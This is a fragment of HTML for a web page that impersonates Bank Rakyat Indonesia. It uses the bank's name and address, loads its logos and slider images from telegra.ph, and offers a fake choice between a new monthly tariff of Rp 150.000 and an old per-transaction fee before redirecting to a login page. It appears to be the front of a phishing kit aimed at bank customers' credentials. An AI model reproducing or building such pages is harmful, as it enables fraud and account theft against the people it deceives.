...
<meta name="description" content="Gedung BRI, Jl. Jendral Sudirman Kav.44-46 Jakarta 1021........">
    ...
    <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui">    <title>PT.Bank Rakyat Indonesia (Persero) Tbk.</title>
...
<main>
<welalxcome>
<img src="https://telegra.ph/file/08a6c7822b7f8cef351a2.jpg" alt="" />
</welalxcome>
...
<img style="margin-bottom:5px; margin-left:20px;" width="90px" src="https://telegra.ph/file/865d9e5472f694bf3ee18.png" alt="" />
<div class="slider">
<figure>
<div class="slide">
<img src="https://telegra.ph/file/7e73b8ec2a262ef746402.png">
</div>
<div class="slide">
<img src="https://telegra.ph/file/d97236c20fb82973c7b64.png">
</div>
<div class="slide">
<img src="https://telegra.ph/file/7e73b8ec2a262ef746402.png/geses1">
 </div>
<div class="slide">
<img src="https://telegra.ph/file/d97236c20fb82973c7b64.png">
</div>
...
<label id="label1">
<input type="checkbox" name="tarif" id="tarif" value='Tarif Baru Rp 150.000 / Bulan'>
Tarif Baru Rp 150.000 / Bulan
</label>
</h4>
<h4 style="color:#09559a;">
<label required id="label2">
<input type="checkbox" name="tarif" id="tarif" value="Tarif Lama Rp 6.500 / Transaksi">
Tarif Lama Rp 6.500 / Transaksi
</label>
</h3>
</div>
<div>
<input type="submit" onclick="location.href='login.html';" style="margin-left: 20px;margin-top: -100px;position:absolute;background-color:#0085e0;color:white;border:1px solid #0085e0;width:90%;border-radius:10px;font-size: 15px;padding:13px;" value="Lanjutkan">
<h6 style="font-family: 'Open Sans', sans-serif; font-size: 13px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;">Terdaftar dan diawasi oleh:</h6>
            <center>
            <div class="css-dnzamn"><img src="https://telegra.ph/file/7fc87d561de8c990cb335.png" width="70"><img src="https://telegra.ph/file/5fd0da3cd95afcbdf8f94.png" width="70"></div>
</div>
</form>
</div>
</smalxs>
